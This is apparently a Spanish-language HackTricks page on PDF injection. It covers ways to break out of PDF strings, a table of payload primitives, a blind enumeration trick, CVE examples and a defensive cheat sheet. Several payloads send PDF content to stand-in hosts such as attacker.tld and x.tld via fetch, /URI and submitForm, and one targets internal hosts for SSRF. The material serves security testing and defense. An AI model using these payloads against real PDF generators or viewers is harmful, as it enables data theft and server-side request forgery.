# Inyección de PDF

{{#include ../../banners/hacktricks-training.md}}

**Si tu entrada se refleja dentro de un archivo PDF, puedes intentar inyectar datos PDF para ejecutar JavaScript, realizar SSRF o robar el contenido del PDF.**
La sintaxis PDF es extremadamente permisiva: si puedes salir de la cadena o diccionario que está incrustando tu entrada, puedes agregar objetos totalmente nuevos (o nuevas claves en el mismo objeto) que Acrobat/Chrome analizará con gusto.
Desde 2024, una ola de informes de recompensas por errores ha demostrado que *un paréntesis o barra invertida no escapado es suficiente* para la ejecución completa de scripts.

## TL;DR – Flujo de Ataque Moderno (2024)
1. Encuentra cualquier valor controlado por el usuario que termine dentro de una **(cadena de paréntesis)**, `/URI ( … )` o campo `/JS ( … )` en el PDF generado.
2. Inyecta `) ` (cerrando la cadena) seguido de uno de los primitivos a continuación y termina con otro paréntesis de apertura para mantener la sintaxis válida.
3. Entrega el PDF malicioso a una víctima (o a un servicio backend que renderiza automáticamente el archivo – excelente para errores ciegos).
4. Tu carga útil se ejecuta en el visor de PDF:
* Chrome / Edge → PDFium Sandbox
* Firefox → PDF.js (ver CVE-2024-4367)
* Acrobat → API de JavaScript completa (puede exfiltrar contenidos de archivos arbitrarios con `this.getPageNthWord`)

Ejemplo (secuestro de enlace de anotación):
```pdf
(https://victim.internal/) ) /A << /S /JavaScript /JS (app.alert("PDF pwned")) >> /Next (
```
*El primer `)` cierra la cadena URI original, luego agregamos un nuevo diccionario **Action** que Acrobat ejecutará cuando el usuario haga clic en el enlace.*

## Primitivas de Inyección Útiles
| Objetivo | Fragmento de Carga Útil | Notas |
|----------|-------------------------|-------|
| **JavaScript al abrir** | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | Se ejecuta instantáneamente cuando se abre el documento (funciona en Acrobat, no en Chrome). |
| **JavaScript en enlace** | `/A << /S /JavaScript /JS (fetch('https://attacker.tld/?c='+this.getPageNumWords(0))) >>` | Funciona en PDFium y Acrobat si controlas una anotación `/Link`. |
| **Exfiltración de datos ciega** | `<< /Type /Action /S /URI /URI (https://attacker.tld/?leak=)` | Combina con `this.getPageNthWord` dentro de JS para robar contenido. |
| **SSRF del lado del servidor** | Igual que arriba pero apunta a una URL interna – excelente cuando el PDF es renderizado por servicios de back-office que respetan `/URI`. |
| **Salto de línea para nuevos objetos** | `\nendobj\n10 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj` | Si la biblioteca te permite inyectar caracteres de nueva línea, puedes crear objetos totalmente nuevos. |

## Truco de Enumeración Ciega
Gareth Heyes (PortSwigger) lanzó una línea de código que enumera cada objeto dentro de un documento desconocido – útil cuando no puedes ver el PDF generado:
```pdf
) /JS (for(i in this){try{this.submitForm('https://x.tld?'+i+'='+this[i])}catch(e){}}) /S /JavaScript /A << >> (
```
El código itera sobre el DOM de Acrobat y realiza solicitudes salientes para cada par de propiedad/valor, dándote un volcado *JSON-ish* del archivo.  
Consulta el documento técnico “Portable Data **ex**Filtration” para la técnica completa.

## Errores del Mundo Real (2023-2025)
* **CVE-2024-4367** – La ejecución arbitraria de JavaScript en PDF.js de Firefox antes de la versión 4.2.67 eludió el sandbox con una acción `/JavaScript` manipulada.  
* **Bug bounty 2024-05** – Una importante fintech permitió notas de factura proporcionadas por el cliente que aterrizaron en `/URI`; el informe pagó $10k después de demostrar SSRF al host de metadatos interno usando `file:///` URI.  
* **CVE-2023-26155** – La inyección de comandos en `node-qpdf` a través de una ruta PDF no sanitizada muestra la importancia de escapar barras invertidas y paréntesis incluso *antes* de la capa PDF.

## Hoja de Trucos Defensiva
1. **Nunca concatene la entrada de usuario sin procesar** dentro de cadenas o nombres `(`…`)`. Escape `\`, `(`, `)` según lo requerido por §7.3 de la especificación PDF o use cadenas hexadecimales `<...>`.  
2. Si construyes enlaces, prefiere `/URI (https://…)` que codifiques *completamente* en URL; bloquea esquemas `javascript:` en visores de cliente.  
3. Elimina o valida los diccionarios `/OpenAction`, `/AA` (acciones adicionales), `/Launch`, `/SubmitForm` y `/ImportData` al procesar PDFs.  
4. En el lado del servidor, renderiza PDFs no confiables con un *convertidor sin cabeza* (por ejemplo, qpdf –decrypt –linearize) que elimina JavaScript y acciones externas.  
5. Mantén los visores de PDF actualizados; PDF.js < 4.2.67 y Acrobat Reader antes de julio de 2024 permiten la ejecución trivial de código.

## Referencias
* Gareth Heyes, “Portable Data exFiltration – XSS for PDFs”, PortSwigger Research (actualizado mayo de 2024). <https://portswigger.net/research/portable-data-exfiltration>  
* Dawid Ryłko, “CVE-2024-4367: Arbitrary JavaScript Execution in PDF.js” (abr 2024). <https://dawid.dev/sec/cve-2024-4367-arbitrary-javascript-execution-in-pdf-js>  
{{#include ../../banners/hacktricks-training.md}}
